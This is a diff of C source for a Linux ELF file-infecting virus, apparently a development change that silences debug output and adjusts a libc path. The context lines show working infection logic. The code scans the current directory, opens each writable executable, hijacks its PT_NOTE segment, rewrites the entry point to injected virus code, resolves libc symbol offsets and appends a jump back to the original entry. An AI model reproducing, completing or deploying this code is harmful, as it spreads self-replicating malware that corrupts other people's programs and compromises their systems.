@@ -124,6 +124,8 @@ marker:
 	my_fputc 	= base_addr + o_fputc;
 	my_printf 	= base_addr + o_printf; 
 
+	//my_printf(STR("base %%x\n", "29"), base_addr);
+
 	infect(
 			my_open,
 			my_close,
@@ -248,12 +250,18 @@ void infect(
 	o_adr[0xd] =  MARKER+0xd;
 
 	my_printf(STR("Virus reporting in\n", "50"));
-	my_printf(STR("printf at %%x\n", "51"), my_printf);
+	//my_printf(STR("printf at %%x\n", "51"), my_printf);
+	//my_printf(STR("readdir at %%x\n", "54"), my_readdir);
+	//my_printf(STR("open at %%x\n", "57"), my_open);
+	//my_printf(STR("close at %%x\n", "55"), my_close);
+	//my_printf(STR("mmap at %%x\n", "56"), my_mmap);
 	my_printf(STR("v_start at %%x\n", "52"), v_start);
 	my_printf(STR("v_size %%d\n", "53"), v_size);
 	dip = my_opendir(STR(".", "00"));
 	while ((dit = my_readdir(dip)) != NULL)
 	{
+		//my_printf(STR("Trying to infect\n", "61"));
+		//my_printf(STR("Trying to infect %%s ", "60"), dit->d_name);
 		// try to open target
 		fdexe = my_open(dit->d_name, O_RDWR);
 		if(fdexe<=0) continue; // next
@@ -279,7 +287,7 @@ void infect(
 			if(phdr->p_type == PT_NOTE) note = phdr;
 		if(note==NULL) 	continue;
 
-		my_printf(STR("Infecting %%s\n", "10"), dit->d_name);
+		my_printf(STR("Infecting %%s ", "10"), dit->d_name);
 
 		v_alignment = 0x1000;
 		//v_size = virus_end-virus_start; // remember to add jmp OEP
@@ -310,7 +318,7 @@ void infect(
 		// neuer entrypoint
 		ehdr->e_entry = v_dynamic_address;
 
-		my_printf(STR("New entrypoint %%x\n", "11"), v_dynamic_address);
+		//my_printf(STR("New entrypoint %%x\n", "11"), v_dynamic_address);
 
 		////////////////////////////////////////////////////////////////////////////////////
 		// Analyze binary:
@@ -354,8 +362,10 @@ void infect(
 					for(k=0; name[k]!=0; ++k)
 						marker_name[k] = name[k];
 					marker_name[k] = 0;
-					my_printf(STR("Using %%s as marker\n", "12"),
-							marker_name);
+					//my_printf(STR("Using %%s as marker\n", "12"),
+					//		marker_name);
+					//my_printf(STR("r_offset: %%x\n", "14"),
+					//		relplt->r_offset);
 					break;
 				}
 				++relplt;
@@ -377,7 +387,8 @@ void infect(
 		////////////////////////////////////////////////////////////////////////////////////
 		// Analyze libc
 		//
-		fdlibc = my_open(STR("/lib/i386-linux-gnu/libc.so.6", "3"), O_RDONLY);
+		fdlibc = my_open(STR("/lib/i386-linux-gnu/i686/cmov/libc.so.6", "3"), O_RDONLY);
+		//fdlibc = my_open(STR("/lib/i386-linux-gnu/libc.so.6", "3"), O_RDONLY);
 		size = my_lseek(fdlibc, 0, SEEK_END);
 		ehdr = (Elf32_Ehdr*)my_mmap(0, size,
 				PROT_READ, MAP_SHARED, fdlibc, 0);
@@ -393,11 +404,12 @@ void infect(
 		strtab = (char*)(string_sec->sh_offset + (char*)ehdr);
 		strtab_size = strtab != NULL ? string_sec->sh_size : 0;
 
+		// get function offsets
 		for (i = 0, psym = symtab;
 				i < dynsym->sh_size / dynsym->sh_entsize;
 				i++, psym++) {
 			name = psym->st_name < strtab_size ? strtab + psym->st_name : "<corrupt>";
-			//my_printf(STR("%%x %%s\n", "100"), psym->st_value, name);
+			//my_printf(STR("%%x %%s\n", "111"), psym->st_value, name);
 			//enum ADR{MARKO, MARKV, LIBO, 
 			//	OPEN, CLOSE, MMAP, MUNMAP, LSEEK, 
 			//	OPENDIR, READDIR, FDOPEN, FCLOSE, FPUTC, PRINTF};
@@ -457,8 +469,8 @@ void infect(
 			for(j=0; j<16; ++j) {
 				//my_printf(STR("%%x -- %%x,  ", "22"), a,  MARKER+j);
 				if(adr[j] != 0 && o_adr[j] != 0 && a == o_adr[j]) {
-					my_printf(STR("Replacing %%x with %%x\n", "21"),
-							a, adr[j]);
+					//my_printf(STR("Replacing %%x with %%x\n", "21"),
+					//		a, adr[j]);
 					char* b = (char*)&adr[j];
 					for(k=0; k<4; ++k)
 						my_fputc(b[k], fpexe);
@@ -470,7 +482,7 @@ void infect(
 			//my_printf(STR("\n", "23"));
 			my_fputc(virus_binary[i], fpexe);
 		}
-		my_printf(STR("\n", "24"));
+		my_printf(STR("-> done\n", "24"));
 
 		// add jmpoep to end of file
 		char* oep = (char*)&old_entry;
